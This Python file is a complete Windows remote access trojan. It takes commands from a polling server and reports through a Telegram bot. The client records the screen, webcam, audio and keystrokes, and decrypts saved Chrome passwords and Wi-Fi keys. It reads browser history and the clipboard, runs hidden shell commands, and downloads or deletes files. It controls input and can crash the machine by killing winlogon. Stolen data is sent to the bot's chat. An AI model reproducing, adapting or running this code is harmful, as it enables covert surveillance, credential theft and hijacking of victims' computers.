import cv2
import pyautogui
import requests
import io
import os
import sys
import time
import subprocess
import platform
import psutil
import tempfile
import threading
import socket
import sqlite3
import shutil
from datetime import datetime
from pathlib import Path

BOT_TOKEN   = "PLACEHOLDER_TOKEN"
CHAT_ID     = "PLACEHOLDER_CHATID"
PC_NAME     = "PLACEHOLDER_PCNAME"
SERVER_URL  = "PLACEHOLDER_SERVER"

BASE_TG = f"https://api.telegram.org/bot{BOT_TOKEN}"

CPU_ALERT_THRESHOLD = 90
keylog_buffer = []
keylog_active = False


def run_hidden(cmd: str) -> None:
    si = subprocess.STARTUPINFO()
    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    si.wShowWindow = subprocess.SW_HIDE
    subprocess.Popen(cmd, shell=True, startupinfo=si,
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def run_cmd(cmd: str, timeout: int = 10) -> str:
    try:
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        si.wShowWindow = subprocess.SW_HIDE
        result = subprocess.run(
            cmd, shell=True, capture_output=True,
            text=True, timeout=timeout, startupinfo=si,
            encoding="cp866", errors="replace"
        )
        return result.stdout.strip() or result.stderr.strip() or "(no output)"
    except subprocess.TimeoutExpired:
        return "Timeout"
    except Exception as e:
        return f"Error: {e}"


def send_message(text: str, parse_mode="Markdown") -> None:
    try:
        requests.post(f"{BASE_TG}/sendMessage", json={
            "chat_id": CHAT_ID, "text": text, "parse_mode": parse_mode,
        }, timeout=10)
    except Exception:
        pass


def send_photo_tg(image_bytes: bytes, caption: str = "") -> None:
    requests.post(f"{BASE_TG}/sendPhoto", data={
        "chat_id": CHAT_ID, "caption": caption
    }, files={"photo": ("photo.jpg", image_bytes, "image/jpeg")}, timeout=15)


def send_audio_tg(file_path: str, caption: str = "") -> None:
    with open(file_path, "rb") as f:
        requests.post(f"{BASE_TG}/sendAudio", data={
            "chat_id": CHAT_ID, "caption": caption
        }, files={"audio": ("audio.wav", f, "audio/wav")}, timeout=30)


def send_video_tg(file_path: str, caption: str = "") -> None:
    with open(file_path, "rb") as f:
        requests.post(f"{BASE_TG}/sendVideo", data={
            "chat_id": CHAT_ID, "caption": caption
        }, files={"video": ("video.mp4", f, "video/mp4")}, timeout=60)


def send_document_tg(file_path: str, caption: str = "") -> None:
    with open(file_path, "rb") as f:
        requests.post(f"{BASE_TG}/sendDocument", data={
            "chat_id": CHAT_ID, "caption": caption
        }, files={"document": (os.path.basename(file_path), f)}, timeout=60)


def poll_server():
    try:
        r = requests.get(f"{SERVER_URL}/poll/{PC_NAME}", timeout=5)
        return r.json().get("task")
    except Exception:
        return None


def do_screenshot() -> bytes:
    buf = io.BytesIO()
    pyautogui.screenshot().save(buf, format="JPEG", quality=85)
    return buf.getvalue()


def do_webcam() -> bytes | None:
    cam = cv2.VideoCapture(0)
    if not cam.isOpened():
        return None
    for _ in range(5):
        cam.read()
    ret, frame = cam.read()
    cam.release()
    if not ret:
        return None
    ok, buf = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 90])
    return bytes(buf) if ok else None


def do_screenshot_series(count: int = 5, interval: int = 5) -> None:
    send_message(f"[{PC_NAME}] 📸 {count} screenshots every {interval}s...")
    for i in range(count):
        now = datetime.now().strftime("%H:%M:%S")
        send_photo_tg(do_screenshot(), f"[{PC_NAME}] {i+1}/{count} • {now}")
        if i < count - 1:
            time.sleep(interval)


def do_audio(seconds: int = 5) -> str | None:
    try:
        import sounddevice as sd
        import soundfile as sf
        samplerate = 44100
        recording = sd.rec(int(seconds * samplerate), samplerate=samplerate, channels=1, dtype="int16")
        sd.wait()
        tmp = tempfile.NamedTemporaryFile(suffix=".wav", delete=False)
        sf.write(tmp.name, recording, samplerate)
        return tmp.name
    except Exception as e:
        send_message(f"[{PC_NAME}] Audio error: `{e}`")
        return None


def do_video(seconds: int = 5) -> str | None:
    try:
        cam = cv2.VideoCapture(0)
        if not cam.isOpened():
            return None
        width  = int(cam.get(cv2.CAP_PROP_FRAME_WIDTH))
        height = int(cam.get(cv2.CAP_PROP_FRAME_HEIGHT))
        tmp = tempfile.NamedTemporaryFile(suffix=".mp4", delete=False)
        out = cv2.VideoWriter(tmp.name, cv2.VideoWriter_fourcc(*"mp4v"), 20, (width, height))
        end_time = time.time() + seconds
        while time.time() < end_time:
            ret, frame = cam.read()
            if ret:
                out.write(frame)
        cam.release()
        out.release()
        return tmp.name
    except Exception as e:
        send_message(f"[{PC_NAME}] Video error: `{e}`")
        return None


def start_keylog(seconds: int = 30) -> None:
    global keylog_buffer, keylog_active
    try:
        from pynput import keyboard
        keylog_buffer = []
        keylog_active = True

        def on_press(key):
            try:
                keylog_buffer.append(key.char)
            except AttributeError:
                keylog_buffer.append(f"[{key.name}]")

        listener = keyboard.Listener(on_press=on_press)
        listener.start()
        time.sleep(seconds)
        listener.stop()
        keylog_active = False
        text = "".join(str(k) for k in keylog_buffer)
        send_message(f"[{PC_NAME}] 🔍 Keylog {seconds}s:\n```\n{text[:3000] if text else '(no keypresses)'}\n```")
    except Exception as e:
        send_message(f"[{PC_NAME}] Keylog error: `{e}`")


def get_clipboard() -> str:
    try:
        import win32clipboard
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        return data[:2000] if data else "(empty)"
    except Exception as e:
        return f"Error: {e}"


def get_chrome_history() -> str:
    try:
        paths = [
            Path(os.environ["LOCALAPPDATA"]) / "Google/Chrome/User Data/Default/History",
            Path(os.environ["LOCALAPPDATA"]) / "Microsoft/Edge/User Data/Default/History",
        ]
        results = []
        for hist_path in paths:
            if not hist_path.exists():
                continue
            tmp = tempfile.NamedTemporaryFile(suffix=".db", delete=False)
            shutil.copy2(str(hist_path), tmp.name)
            conn = sqlite3.connect(tmp.name)
            cursor = conn.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 20")
            browser = "Chrome" if "Chrome" in str(hist_path) else "Edge"
            results.append(f"*{browser}:*")
            for url, title in cursor.fetchall():
                results.append(f"  • {title[:40]} — {url[:60]}")
            conn.close()
            os.unlink(tmp.name)
        return "\n".join(results) if results else "No history found"
    except Exception as e:
        return f"Error: {e}"


def get_chrome_passwords() -> str:
    try:
        import json, base64
        from Crypto.Cipher import AES
        import win32crypt

        local_state_path = Path(os.environ["LOCALAPPDATA"]) / "Google/Chrome/User Data/Local State"
        if not local_state_path.exists():
            return "Chrome not found"
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        login_db = Path(os.environ["LOCALAPPDATA"]) / "Google/Chrome/User Data/Default/Login Data"
        tmp = tempfile.NamedTemporaryFile(suffix=".db", delete=False)
        shutil.copy2(str(login_db), tmp.name)
        conn = sqlite3.connect(tmp.name)
        cursor = conn.execute("SELECT origin_url, username_value, password_value FROM logins LIMIT 20")
        results = ["*Chrome Passwords:*"]
        for url, username, encrypted_pw in cursor.fetchall():
            try:
                iv = encrypted_pw[3:15]
                payload = encrypted_pw[15:]
                cipher = AES.new(key, AES.MODE_GCM, iv)
                password = cipher.decrypt(payload)[:-16].decode()
                results.append(f"🔑 {url[:40]}\n   👤 {username} | 🔒 {password}")
            except Exception:
                pass
        conn.close()
        os.unlink(tmp.name)
        return "\n".join(results) if len(results) > 1 else "No passwords found"
    except Exception as e:
        return f"Error: {e}"


def get_wifi_passwords() -> str:
    try:
        profiles_output = run_cmd("netsh wlan show profiles")
        profiles = [l.split(":")[1].strip() for l in profiles_output.split("\n") if "All User Profile" in l]
        results = ["*WiFi Passwords:*"]
        for profile in profiles[:15]:
            output = run_cmd(f'netsh wlan show profile name="{profile}" key=clear')
            for line in output.split("\n"):
                if "Key Content" in line:
                    password = line.split(":")[1].strip()
                    results.append(f"📶 `{profile}` — 🔑 `{password}`")
                    break
            else:
                results.append(f"📶 `{profile}` — (no password)")
        return "\n".join(results)
    except Exception as e:
        return f"Error: {e}"


def do_ls(path: str = "C:\\") -> str:
    try:
        p = Path(path)
        if not p.exists():
            return f"Path not found: {path}"
        items = list(p.iterdir())[:50]
        lines = [f"`{path}`\n"]
        for item in items:
            size = ""
            try:
                if item.is_file():
                    size = f" ({item.stat().st_size // 1024} KB)"
            except Exception:
                pass
            lines.append(f"{'📁' if item.is_dir() else '📄'} {item.name}{size}")
        return "\n".join(lines)
    except Exception as e:
        return f"Error: {e}"


def do_download(path: str) -> str | None:
    try:
        p = Path(path)
        if not p.exists():
            send_message(f"[{PC_NAME}] Not found: `{path}`")
            return None
        if p.stat().st_size > 50 * 1024 * 1024:
            send_message(f"[{PC_NAME}] File too large (>50MB)")
            return None
        return str(p)
    except Exception as e:
        send_message(f"[{PC_NAME}] Error: `{e}`")
        return None


def do_delete(path: str) -> str:
    try:
        Path(path).unlink()
        return f"[{PC_NAME}] 🗑️ Deleted: `{path}`"
    except Exception as e:
        return f"[{PC_NAME}] Error: `{e}`"


def get_ip() -> str:
    try:
        local_ip  = socket.gethostbyname(socket.gethostname())
        public_ip = requests.get("https://api.ipify.org", timeout=5).text
        return f"[{PC_NAME}]\n🏠 Local: `{local_ip}`\n🌐 Public: `{public_ip}`"
    except Exception as e:
        return f"Error: {e}"


def get_wifi() -> str:
    output = run_cmd("netsh wlan show networks mode=bssid")
    lines  = [l for l in output.split("\n") if any(k in l for k in ["SSID", "Signal", "Authentication"])]
    return f"[{PC_NAME}] 📶 WiFi:\n```\n{chr(10).join(lines[:30])}\n```"


def get_netstat() -> str:
    output = run_cmd("netstat -an | findstr ESTABLISHED")
    return f"[{PC_NAME}] 🌐 Connections:\n```\n{output[:2000]}\n```"


def do_sysinfo() -> str:
    cpu  = psutil.cpu_percent(interval=1)
    ram  = psutil.virtual_memory()
    disk = psutil.disk_usage("/")
    uptime_sec = int(time.time() - psutil.boot_time())
    h, m = divmod(uptime_sec // 60, 60)
    lines = [
        f"*PC:* `{PC_NAME}`",
        f"*OS:* {platform.system()} {platform.release()}",
        f"*Uptime:* {h}h {m}m",
        f"*CPU:* {cpu}%",
        f"*RAM:* {ram.used // 1024**2} / {ram.total // 1024**2} MB ({ram.percent}%)",
        f"*Disk:* {disk.used // 1024**3} / {disk.total // 1024**3} GB ({disk.percent}%)",
    ]
    try:
        battery = psutil.sensors_battery()
        if battery:
            lines.append(f"*Battery:* {int(battery.percent)}% {'⚡' if battery.power_plugged else '🔋'}")
    except Exception:
        pass
    top = sorted(psutil.process_iter(["name", "cpu_percent"]),
                 key=lambda p: p.info["cpu_percent"] or 0, reverse=True)[:5]
    lines.append("\n*Top processes:*")
    for p in top:
        lines.append(f"  - {p.info['name']} {p.info['cpu_percent']}%")
    return "\n".join(lines)


def get_processes() -> str:
    procs = sorted(psutil.process_iter(["name", "cpu_percent", "memory_info"]),
                   key=lambda p: p.info["cpu_percent"] or 0, reverse=True)[:20]
    lines = [f"{'Name':<30} {'CPU':>6} {'RAM':>8}", "-" * 48]
    for p in procs:
        try:
            ram_mb = p.info["memory_info"].rss // 1024 // 1024
            lines.append(f"{p.info['name'][:30]:<30} {p.info['cpu_percent']:>5}% {ram_mb:>6}MB")
        except Exception:
            pass
    return f"[{PC_NAME}] 📋\n```\n{chr(10).join(lines)}\n```"


def kill_process(name: str) -> str:
    killed = 0
    for proc in psutil.process_iter(["name"]):
        if proc.info["name"].lower() == name.lower():
            try:
                proc.kill()
                killed += 1
            except Exception:
                pass
    return f"[{PC_NAME}] ☠️ Killed {killed}x: `{name}`"


def get_startup() -> str:
    output = run_cmd('reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"')
    return f"[{PC_NAME}] 🚀 Startup:\n```\n{output[:2000]}\n```"


def get_installed() -> str:
    output = run_cmd("wmic product get name,version /format:csv")
    lines  = [l for l in output.split("\n") if l.strip() and "Node" not in l][:30]
    return f"[{PC_NAME}] 📦\n```\n{chr(10).join(lines)}\n```"


def get_active_window() -> str:
    try:
        import win32gui
        title = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        return f"[{PC_NAME}] 🖥️ Active: `{title}`"
    except Exception as e:
        return f"Error: {e}"


def volume_change(delta: int) -> str:
    key = "175" if delta > 0 else "174"
    run_hidden(f'powershell -c "$wsh = New-Object -ComObject WScript.Shell; $wsh.SendKeys([char]{key})"')
    return f"[{PC_NAME}] {'🔊 +10%' if delta > 0 else '🔉 -10%'}"


def volume_mute() -> str:
    run_hidden('powershell -c "$wsh = New-Object -ComObject WScript.Shell; $wsh.SendKeys([char]173)"')
    return f"[{PC_NAME}] 🔕 Muted"


def lock_screen() -> str:
    run_hidden("rundll32.exe user32.dll,LockWorkStation")
    return f"[{PC_NAME}] 🔒 Locked"


def open_url(url: str) -> str:
    if not url.startswith("http"):
        url = "https://" + url
    import webbrowser
    webbrowser.open(url)
    return f"[{PC_NAME}] 🌐 Opened: {url}"


def power_action(action: str) -> str:
    cmds = {
        "sleep":    "rundll32.exe powrprof.dll,SetSuspendState 0,1,0",
        "restart":  "shutdown /r /t 5",
        "shutdown": "shutdown /s /t 5",
    }
    if c := cmds.get(action):
        run_hidden(c)
    return f"[{PC_NAME}] {action} done"


def do_type(text: str) -> str:
    try:
        pyautogui.typewrite(text, interval=0.05)
        return f"[{PC_NAME}] ⌨️ Typed: `{text}`"
    except Exception as e:
        return f"Error: {e}"


def do_click(args: str) -> str:
    try:
        x, y = map(int, args.split())
        pyautogui.click(x, y)
        return f"[{PC_NAME}] 🖱️ Clicked: ({x}, {y})"
    except Exception as e:
        return f"Error: {e}"


def do_move(args: str) -> str:
    try:
        x, y = map(int, args.split())
        pyautogui.moveTo(x, y)
        return f"[{PC_NAME}] 🖱️ Moved: ({x}, {y})"
    except Exception as e:
        return f"Error: {e}"


def do_scroll(args: str) -> str:
    try:
        pyautogui.scroll(-(int(args) if args else 3))
        return f"[{PC_NAME}] 🖱️ Scrolled"
    except Exception as e:
        return f"Error: {e}"


def do_key(key: str) -> str:
    try:
        pyautogui.press(key)
        return f"[{PC_NAME}] ⌨️ Key: `{key}`"
    except Exception as e:
        return f"Error: {e}"


def do_popup(text: str) -> str:
    run_hidden(f'msg * "{text}"')
    return f"[{PC_NAME}] 💬 Popup sent"


def do_wallpaper(url: str) -> str:
    try:
        import ctypes
        r = requests.get(url, timeout=10)
        tmp = tempfile.NamedTemporaryFile(suffix=".jpg", delete=False)
        tmp.write(r.content)
        tmp.close()
        ctypes.windll.user32.SystemParametersInfoW(20, 0, tmp.name, 3)
        return f"[{PC_NAME}] 🖼️ Wallpaper changed"
    except Exception as e:
        return f"Error: {e}"


def do_invert() -> str:
    pyautogui.hotkey("win", "ctrl", "i")
    return f"[{PC_NAME}] 🌀 Colors inverted"


def do_cd() -> str:
    run_hidden("powershell -c \"(New-Object -ComObject WMPlayer.OCX.7).cdromCollection.Item(0).Eject()\"")
    return f"[{PC_NAME}] 💿 CD ejected"


def do_bsod() -> str:
    run_hidden("powershell -c \"Stop-Process -Force -Name winlogon\"")
    return f"[{PC_NAME}] 💀 BSOD..."


def trigger_loop():
    cpu_alerted = False
    while True:
        try:
            cpu = psutil.cpu_percent(interval=2)
            if cpu >= CPU_ALERT_THRESHOLD and not cpu_alerted:
                send_message(f"🔥 [{PC_NAME}] CPU ALERT: {cpu}%")
                cpu_alerted = True
            elif cpu < CPU_ALERT_THRESHOLD - 10:
                cpu_alerted = False
        except Exception:
            pass
        time.sleep(5)


def parse_seconds(args: str, default: int = 5) -> int:
    try:
        return max(1, min(int(args.strip()), 60))
    except Exception:
        return default


def handle(cmd: str, args: str) -> None:
    now = datetime.now().strftime("%H:%M:%S")

    if cmd == "/screenshot":
        send_photo_tg(do_screenshot(), f"[{PC_NAME}] Screenshot {now}")
    elif cmd == "/webcam":
        data = do_webcam()
        send_photo_tg(data, f"[{PC_NAME}] Webcam {now}") if data else send_message(f"[{PC_NAME}] Webcam not found")
    elif cmd == "/screenshots":
        parts = args.split()
        count = int(parts[0]) if len(parts) > 0 else 5
        interval = int(parts[1]) if len(parts) > 1 else 5
        threading.Thread(target=do_screenshot_series, args=(count, interval), daemon=True).start()
    elif cmd == "/audio":
        seconds = parse_seconds(args, 5)
        send_message(f"[{PC_NAME}] 🎤 Recording {seconds}s...")
        path = do_audio(seconds)
        if path:
            send_audio_tg(path, f"[{PC_NAME}] Audio {seconds}s • {now}")
            os.remove(path)
    elif cmd == "/video":
        seconds = parse_seconds(args, 5)
        send_message(f"[{PC_NAME}] 🎥 Recording {seconds}s...")
        path = do_video(seconds)
        if path:
            send_video_tg(path, f"[{PC_NAME}] Video {seconds}s • {now}")
            os.remove(path)
    elif cmd == "/keylog":
        seconds = parse_seconds(args, 30)
        send_message(f"[{PC_NAME}] 🔍 Keylogging {seconds}s...")
        threading.Thread(target=start_keylog, args=(seconds,), daemon=True).start()
    elif cmd == "/clipboard":
        send_message(f"[{PC_NAME}] 📋 Clipboard:\n```\n{get_clipboard()}\n```")
    elif cmd == "/activewindow":
        send_message(get_active_window())
    elif cmd == "/history":
        send_message(f"[{PC_NAME}] 🌐 History:\n{get_chrome_history()}")
    elif cmd == "/passwords":
        send_message(get_chrome_passwords())
    elif cmd == "/ls":
        send_message(do_ls(args.strip() if args else "C:\\"))
    elif cmd == "/download":
        if args:
            path = do_download(args.strip())
            if path:
                send_document_tg(path, f"[{PC_NAME}] {args.strip()}")
        else:
            send_message(f"Usage: /download {PC_NAME} C:\\file.txt")
    elif cmd == "/delete":
        send_message(do_delete(args.strip()) if args else f"Usage: /delete {PC_NAME} C:\\file.txt")
    elif cmd == "/ip":
        send_message(get_ip())
    elif cmd == "/wifi":
        send_message(get_wifi())
    elif cmd == "/wifi_passwords":
        send_message(get_wifi_passwords())
    elif cmd == "/netstat":
        send_message(get_netstat())
    elif cmd == "/sysinfo":
        send_message(do_sysinfo())
    elif cmd == "/processes":
        send_message(get_processes())
    elif cmd == "/kill":
        send_message(kill_process(args.strip()) if args else f"Usage: /kill {PC_NAME} chrome.exe")
    elif cmd == "/startup":
        send_message(get_startup())
    elif cmd == "/installed":
        send_message(get_installed())
    elif cmd == "/volume_up":
        send_message(volume_change(+10))
    elif cmd == "/volume_down":
        send_message(volume_change(-10))
    elif cmd == "/mute":
        send_message(volume_mute())
    elif cmd == "/type":
        send_message(do_type(args) if args else f"Usage: /type {PC_NAME} hello world")
    elif cmd == "/click":
        send_message(do_click(args) if args else f"Usage: /click {PC_NAME} 500 300")
    elif cmd == "/move":
        send_message(do_move(args) if args else f"Usage: /move {PC_NAME} 500 300")
    elif cmd == "/scroll":
        send_message(do_scroll(args))
    elif cmd == "/key":
        send_message(do_key(args) if args else f"Usage: /key {PC_NAME} enter")
    elif cmd == "/run":
        send_message(f"[{PC_NAME}] `{args}`\n```\n{run_cmd(args)[:2000]}\n```" if args else f"Usage: /run {PC_NAME} ipconfig")
    elif cmd == "/open":
        send_message(open_url(args) if args else f"Usage: /open {PC_NAME} google.com")
    elif cmd == "/lock":
        send_message(lock_screen())
    elif cmd == "/sleep":
        send_message(f"[{PC_NAME}] 💤 Sleeping...")
        power_action("sleep")
    elif cmd == "/restart":
        send_message(f"[{PC_NAME}] 🔁 Restarting in 5s...")
        power_action("restart")
    elif cmd == "/shutdown":
        send_message(f"[{PC_NAME}] ⚡ Shutting down in 5s...")
        power_action("shutdown")
    elif cmd == "/popup":
        send_message(do_popup(args) if args else f"Usage: /popup {PC_NAME} hello!")
    elif cmd == "/wallpaper":
        send_message(do_wallpaper(args) if args else f"Usage: /wallpaper {PC_NAME} https://url.jpg")
    elif cmd == "/invert":
        send_message(do_invert())
    elif cmd == "/cd":
        send_message(do_cd())
    elif cmd == "/flip":
        send_message(f"[{PC_NAME}] 🔄 Flipping screen...")
        run_hidden("DisplaySwitch.exe /internal")
    elif cmd == "/bsod":
        send_message(f"[{PC_NAME}] 💀 BSOD incoming...")
        time.sleep(1)
        do_bsod()
    elif cmd == "/stop":
        send_message(f"[{PC_NAME}] 👋 Stopped.")
        sys.exit(0)
    else:
        send_message(f"[{PC_NAME}] ❓ Unknown: `{cmd}`")


def main():
    print(f"Client started as [{PC_NAME}]")
    print(f"Server: {SERVER_URL}")
    threading.Thread(target=trigger_loop, daemon=True).start()
    send_message(f"✅ `{PC_NAME}` online — {datetime.now().strftime('%H:%M:%S')}")
    while True:
        try:
            task = poll_server()
            if task:
                cmd  = task.get("cmd", "")
                args = task.get("args", "")
                print(f"CMD: {cmd} | args: {args}")
                try:
                    handle(cmd, args)
                except Exception as e:
                    send_message(f"[{PC_NAME}] Error: `{e}`")
        except Exception as e:
            print(f"Poll error: {e}")
        time.sleep(1)


if __name__ == "__main__":
    main()
